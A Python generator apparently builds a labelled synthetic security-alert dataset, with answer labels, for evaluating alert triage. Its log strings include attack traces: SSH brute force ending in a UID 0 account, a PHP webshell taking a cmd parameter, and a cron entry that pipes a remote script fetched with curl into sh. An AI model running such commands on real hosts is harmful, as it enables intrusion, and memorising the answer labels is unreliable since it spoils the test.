import json
from datetime import datetime, timedelta, timezone
from pathlib import Path

HERE = Path(__file__).parent
BASE = datetime(2026, 8, 18, 0, 0, 0, tzinfo=timezone.utc)

CASES: list[dict] = []


def case(name: str, host: str, offset_hours: float, label: dict, alerts: list[tuple]) -> None:
    CASES.append(
        {
            "name": name,
            "host": host,
            "start": BASE + timedelta(hours=offset_hours),
            "label": label,
            "alerts": alerts,
        }
    )


def label(verdict, escalate, severity, techniques, note):
    return {
        "verdict": verdict,
        "escalate": escalate,
        "severity": severity,
        "techniques": techniques,
        "note": note,
    }


case(
    "bruteforce_success", "web01", 2.23,
    label("true_positive", True, "high", ["T1110.001", "T1078", "T1136.001", "T1548.003"],
          "Password guessing from one public address ends in a successful login and immediate account creation."),
    [
        (0, "5710", 5, "sshd: Attempt to login using a non-existent user",
         ["syslog", "sshd", "invalid_login", "authentication_failed"], ["T1110.001"],
         {"srcip": "203.0.113.45", "srcuser": "admin"},
         "Aug 18 02:14:03 web01 sshd[2201]: Failed password for invalid user admin from 203.0.113.45 port 51002 ssh2"),
        (9, "5710", 5, "sshd: Attempt to login using a non-existent user",
         ["syslog", "sshd", "invalid_login", "authentication_failed"], ["T1110.001"],
         {"srcip": "203.0.113.45", "srcuser": "oracle"},
         "Aug 18 02:14:12 web01 sshd[2203]: Failed password for invalid user oracle from 203.0.113.45 port 51006 ssh2"),
        (7, "5712", 10, "sshd: brute force trying to get access to the system. Non existent user.",
         ["syslog", "sshd", "authentication_failures"], ["T1110.001"],
         {"srcip": "203.0.113.45"},
         "Aug 18 02:14:19 web01 sshd[2205]: Failed password for invalid user test from 203.0.113.45 port 51011 ssh2"),
        (48, "5715", 3, "sshd: authentication success.",
         ["syslog", "sshd", "authentication_success"], ["T1078"],
         {"srcip": "203.0.113.45", "srcuser": "backup"},
         "Aug 18 02:15:07 web01 sshd[2240]: Accepted password for backup from 203.0.113.45 port 51044 ssh2"),
        (31, "5402", 3, "Successful sudo to ROOT executed",
         ["syslog", "sudo"], ["T1548.003"],
         {"srcuser": "backup", "process": "/bin/bash"},
         "Aug 18 02:15:38 web01 sudo: backup : TTY=pts/1 ; PWD=/home/backup ; USER=root ; COMMAND=/bin/bash"),
        (44, "5902", 8, "New user added to the system",
         ["syslog", "adduser", "account_changed"], ["T1136.001"],
         {"srcuser": "backup"},
         "Aug 18 02:16:22 web01 useradd[2261]: new user: name=svc_update, UID=0, GID=0, home=/home/svc_update, shell=/bin/bash"),
    ],
)

case(
    "webshell", "web01", 6.5,
    label("true_positive", True, "high", ["T1190", "T1505.003"],
          "Scanner enumeration followed by a 200 on an uploaded PHP path carrying a command parameter."),
    [
        (0, "31101", 5, "Web server 400 error code.", ["web", "accesslog", "attack"], [],
         {"srcip": "198.51.100.77"},
         '198.51.100.77 - - [18/Aug/2026:06:30:00 +0000] "GET /wp-login.php HTTP/1.1" 404 209 "-" "curl/8.5.0"'),
        (3, "31101", 5, "Web server 400 error code.", ["web", "accesslog", "attack"], [],
         {"srcip": "198.51.100.77"},
         '198.51.100.77 - - [18/Aug/2026:06:30:03 +0000] "GET /.env HTTP/1.1" 404 209 "-" "curl/8.5.0"'),
        (4, "31151", 10, "Multiple web server 400 error codes from same source ip.",
         ["web", "accesslog", "web_scan", "recon"], ["T1190"],
         {"srcip": "198.51.100.77"},
         '198.51.100.77 - - [18/Aug/2026:06:30:07 +0000] "GET /phpmyadmin/index.php HTTP/1.1" 404 209 "-" "curl/8.5.0"'),
        (66, "31108", 6, "PHP file uploaded to a writable directory.",
         ["web", "accesslog", "attack"], ["T1505.003"],
         {"srcip": "198.51.100.77"},
         '198.51.100.77 - - [18/Aug/2026:06:31:13 +0000] "POST /uploads/thumb.php HTTP/1.1" 200 42 "-" "curl/8.5.0"'),
        (22, "31103", 12, "SQL injection or command execution attempt in URL.",
         ["web", "accesslog", "attack", "sql_injection"], ["T1505.003"],
         {"srcip": "198.51.100.77"},
         '198.51.100.77 - - [18/Aug/2026:06:31:35 +0000] "GET /uploads/thumb.php?cmd=id HTTP/1.1" 200 31 "-" "curl/8.5.0"'),
    ],
)

case(
    "cron_persistence", "web01", 9.1,
    label("true_positive", True, "high", ["T1053.003", "T1105", "T1059.004"],
          "A service account rewrites its crontab to pull a remote script and pipe it to a shell."),
    [
        (0, "2833", 8, "Crontab entry modified.", ["syslog", "cron", "config_changed"], ["T1053.003"],
         {"srcuser": "svc_update"},
         "Aug 18 09:06:00 web01 crontab[7781]: (svc_update) REPLACE (svc_update)"),
        (41, "533", 10, "Suspicious command executed from a scheduled task.",
         ["syslog", "cron"], ["T1105"],
         {"srcuser": "svc_update"},
         "Aug 18 09:06:41 web01 CRON[7802]: (svc_update) CMD (curl -s http://198.18.7.9/p.sh | sh)"),
    ],
)

case(
    "exfil_staging", "db01", 13.75,
    label("true_positive", True, "critical", ["T1074.001", "T1048"],
          "Bulk archive written to /tmp on the customer database, then pushed outbound to a public address."),
    [
        (0, "554", 7, "File added to the system.",
         ["ossec", "syscheck", "syscheck_entry_added"], ["T1074.001"],
         {"process": "/tmp/.cache/db_dump.tar.gz"},
         "Aug 18 13:45:00 db01 ossec: File '/tmp/.cache/db_dump.tar.gz' added to the file system."),
        (95, "5402", 3, "Successful sudo to ROOT executed", ["syslog", "sudo"], [],
         {"srcuser": "appsvc", "process": "/usr/bin/mysqldump"},
         "Aug 18 13:46:35 db01 sudo: appsvc : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/mysqldump --all-databases"),
        (120, "31530", 12, "Large outbound transfer to an external address.",
         ["firewall", "network"], ["T1048"],
         {"srcip": "45.61.184.12"},
         "Aug 18 13:48:35 db01 kernel: OUT=eth0 DST=45.61.184.12 PROTO=TCP DPT=443 LEN=1420 BYTES=2118934012"),
    ],
)

case(
    "lateral_ssh", "db01", 16.4,
    label("true_positive", True, "high", ["T1021.004", "T1098.004"],
          "New authorized key on the database host followed by a key-based login from the web tier."),
    [
        (0, "550", 7, "Integrity checksum changed.",
         ["ossec", "syscheck", "syscheck_entry_modified"], ["T1098.004"],
         {"process": "/home/appsvc/.ssh/authorized_keys"},
         "Aug 18 16:24:00 db01 ossec: Integrity checksum changed for: '/home/appsvc/.ssh/authorized_keys'"),
        (74, "5715", 3, "sshd: authentication success.",
         ["syslog", "sshd", "authentication_success"], ["T1021.004"],
         {"srcip": "10.10.2.15", "srcuser": "appsvc"},
         "Aug 18 16:25:14 db01 sshd[8812]: Accepted publickey for appsvc from 10.10.2.15 port 44120 ssh2: RSA SHA256:Xk9"),
    ],
)

case(
    "pkexec_privesc", "app02", 19.2,
    label("true_positive", True, "high", ["T1548.001"],
          "Unprivileged web account fails sudo, then crashes a setuid helper in the way CVE-2021-4034 does."),
    [
        (0, "5401", 5, "Failed attempt to run sudo", ["syslog", "sudo"], [],
         {"srcuser": "www-data"},
         "Aug 18 19:12:00 app02 sudo: www-data : user NOT in sudoers ; TTY=pts/3 ; PWD=/var/www ; USER=root ; COMMAND=/bin/sh"),
        (37, "5104", 12, "Suspicious kernel trap raised by a setuid binary.",
         ["syslog", "kernel"], ["T1548.001"],
         {"srcuser": "www-data", "process": "/usr/bin/pkexec"},
         "Aug 18 19:12:37 app02 kernel: traps: pkexec[4471] trap invalid opcode ip:7f1 sp:7ff error:0 in libc.so.6"),
    ],
)

case(
    "apt_upgrade_fim", "app02", 4.0,
    label("false_positive", False, "informational", [],
          "A burst of integrity changes confined to package-managed paths during a scheduled upgrade window."),
    [
        (0, "2902", 3, "New dpkg (Debian Package) installed.",
         ["syslog", "dpkg", "config_changed"], [], {},
         "Aug 18 04:00:00 app02 dpkg: status installed libssl3:amd64 3.0.13-1"),
        (6, "550", 7, "Integrity checksum changed.",
         ["ossec", "syscheck", "syscheck_entry_modified"], [],
         {"process": "/usr/bin/openssl"},
         "Aug 18 04:00:06 app02 ossec: Integrity checksum changed for: '/usr/bin/openssl'"),
        (4, "550", 7, "Integrity checksum changed.",
         ["ossec", "syscheck", "syscheck_entry_modified"], [],
         {"process": "/usr/lib/x86_64-linux-gnu/libssl.so.3"},
         "Aug 18 04:00:10 app02 ossec: Integrity checksum changed for: '/usr/lib/x86_64-linux-gnu/libssl.so.3'"),
        (5, "550", 7, "Integrity checksum changed.",
         ["ossec", "syscheck", "syscheck_entry_modified"], [],
         {"process": "/usr/bin/c_rehash"},
         "Aug 18 04:00:15 app02 ossec: Integrity checksum changed for: '/usr/bin/c_rehash'"),
    ],
)

case(
    "admin_maintenance", "app02", 10.5,
    label("false_positive", False, "informational", [],
          "Named administrator on an internal address running a package upgrade during working hours."),
    [
        (0, "5715", 3, "sshd: authentication success.",
         ["syslog", "sshd", "authentication_success"], [],
         {"srcip": "10.10.4.22", "srcuser": "natali"},
         "Aug 18 10:30:00 app02 sshd[4102]: Accepted publickey for natali from 10.10.4.22 port 49221 ssh2: RSA SHA256:9Qk"),
        (25, "5402", 3, "Successful sudo to ROOT executed", ["syslog", "sudo"], [],
         {"srcuser": "natali", "process": "/usr/bin/apt-get"},
         "Aug 18 10:30:25 app02 sudo: natali : TTY=pts/0 ; PWD=/home/natali ; USER=root ; COMMAND=/usr/bin/apt-get upgrade -y"),
    ],
)

case(
    "internet_noise", "web01", 21.6,
    label("false_positive", False, "low", [],
          "Untargeted credential guessing from scattered addresses against an internet-facing host, none successful."),
    [
        (0, "5710", 5, "sshd: Attempt to login using a non-existent user",
         ["syslog", "sshd", "invalid_login", "authentication_failed"], ["T1110.001"],
         {"srcip": "198.51.100.14", "srcuser": "root"},
         "Aug 18 21:36:00 web01 sshd[3301]: Failed password for invalid user root from 198.51.100.14 port 40122 ssh2"),
        (120, "5710", 5, "sshd: Attempt to login using a non-existent user",
         ["syslog", "sshd", "invalid_login", "authentication_failed"], ["T1110.001"],
         {"srcip": "203.0.113.201", "srcuser": "pi"},
         "Aug 18 21:38:00 web01 sshd[3320]: Failed password for invalid user pi from 203.0.113.201 port 41880 ssh2"),
        (180, "5710", 5, "sshd: Attempt to login using a non-existent user",
         ["syslog", "sshd", "invalid_login", "authentication_failed"], ["T1110.001"],
         {"srcip": "192.0.2.66", "srcuser": "admin"},
         "Aug 18 21:41:00 web01 sshd[3355]: Failed password for invalid user admin from 192.0.2.66 port 55010 ssh2"),
    ],
)

case(
    "backup_failure", "db01", 3.5,
    label("false_positive", False, "informational", [],
          "A backup job failing the same way it fails every night. An operational fault, not a security event."),
    [
        (0, "1002", 2, "Unknown problem somewhere in the system.", ["syslog", "errors"], [], {},
         "Aug 18 03:30:00 db01 backup.sh[3311]: rsync: connection unexpectedly closed (0 bytes received)"),
        (2, "1002", 2, "Unknown problem somewhere in the system.", ["syslog", "errors"], [], {},
         "Aug 18 03:30:02 db01 backup.sh[3311]: error: backup run failed with status 12"),
    ],
)

case(
    "scanner_404s", "web01", 11.9,
    label("false_positive", False, "low", [],
          "Commodity scanner sweeping known paths. Every response is a 404 and nothing follows."),
    [
        (0, "31101", 5, "Web server 400 error code.", ["web", "accesslog", "attack"], [],
         {"srcip": "192.0.2.130"},
         '192.0.2.130 - - [18/Aug/2026:11:54:00 +0000] "GET /vendor/phpunit/eval-stdin.php HTTP/1.1" 404 209 "-" "Mozilla/5.0 zgrab/0.x"'),
        (2, "31101", 5, "Web server 400 error code.", ["web", "accesslog", "attack"], [],
         {"srcip": "192.0.2.130"},
         '192.0.2.130 - - [18/Aug/2026:11:54:02 +0000] "GET /solr/admin/info/system HTTP/1.1" 404 209 "-" "Mozilla/5.0 zgrab/0.x"'),
        (3, "31151", 10, "Multiple web server 400 error codes from same source ip.",
         ["web", "accesslog", "web_scan", "recon"], ["T1190"],
         {"srcip": "192.0.2.130"},
         '192.0.2.130 - - [18/Aug/2026:11:54:05 +0000] "GET /_ignition/execute-solution HTTP/1.1" 404 209 "-" "Mozilla/5.0 zgrab/0.x"'),
    ],
)

case(
    "build_churn", "build01", 14.25,
    label("false_positive", False, "informational", [],
          "Continuous integration workspace churn on a host whose entire job is creating and deleting files."),
    [
        (0, "554", 7, "File added to the system.",
         ["ossec", "syscheck", "syscheck_entry_added"], [],
         {"process": "/var/lib/jenkins/workspace/api/target/api.jar"},
         "Aug 18 14:15:00 build01 ossec: File '/var/lib/jenkins/workspace/api/target/api.jar' added to the file system."),
        (11, "554", 7, "File added to the system.",
         ["ossec", "syscheck", "syscheck_entry_added"], [],
         {"process": "/var/lib/jenkins/workspace/api/target/classes/App.class"},
         "Aug 18 14:15:11 build01 ossec: File '/var/lib/jenkins/workspace/api/target/classes/App.class' added to the file system."),
        (9, "550", 7, "Integrity checksum changed.",
         ["ossec", "syscheck", "syscheck_entry_modified"], [],
         {"process": "/var/lib/jenkins/workspace/api/pom.xml"},
         "Aug 18 14:15:20 build01 ossec: Integrity checksum changed for: '/var/lib/jenkins/workspace/api/pom.xml'"),
    ],
)

case(
    "offhours_login", "app02", 1.05,
    label("inconclusive", True, "medium", ["T1078"],
          "A real account authenticating from an unfamiliar public address at 01:03, with nothing before or after it."),
    [
        (0, "5715", 3, "sshd: authentication success.",
         ["syslog", "sshd", "authentication_success"], ["T1078"],
         {"srcip": "91.203.144.8", "srcuser": "dmitri"},
         "Aug 18 01:03:00 app02 sshd[1180]: Accepted password for dmitri from 91.203.144.8 port 39221 ssh2"),
    ],
)

case(
    "offhours_useradd", "build01", 2.05,
    label("inconclusive", True, "medium", ["T1136.001"],
          "Account creation at 02:03 with no session, no sudo, and no provisioning context in the data."),
    [
        (0, "5902", 8, "New user added to the system",
         ["syslog", "adduser", "account_changed"], ["T1136.001"], {},
         "Aug 18 02:03:00 build01 useradd[6610]: new user: name=ci_runner2, UID=1005, GID=1005, home=/home/ci_runner2, shell=/bin/bash"),
    ],
)


def build() -> tuple[list[dict], dict]:
    records: list[dict] = []
    labels: dict[str, dict] = {}
    for entry in CASES:
        labels[entry["name"]] = entry["label"]
        clock = entry["start"]
        for n, (gap, rid, level, desc, groups, mitre, data, log) in enumerate(entry["alerts"]):
            clock = clock + timedelta(seconds=gap)
            records.append(
                {
                    "id": f"{entry['name']}-{n}",
                    "timestamp": clock.isoformat().replace("+00:00", "Z"),
                    "rule": {
                        "id": rid,
                        "level": level,
                        "description": desc,
                        "groups": groups,
                        "mitre": {"id": mitre},
                    },
                    "agent": {"name": entry["host"]},
                    "data": data,
                    "full_log": log,
                    "case": entry["name"],
                }
            )
    records.sort(key=lambda r: r["timestamp"])
    return records, labels


if __name__ == "__main__":
    records, labels = build()
    (HERE / "alerts.jsonl").write_text(
        "\n".join(json.dumps(r) for r in records) + "\n", encoding="utf-8"
    )
    (HERE / "labels.json").write_text(json.dumps(labels, indent=2), encoding="utf-8")
    print(f"{len(records)} alerts across {len(labels)} cases")
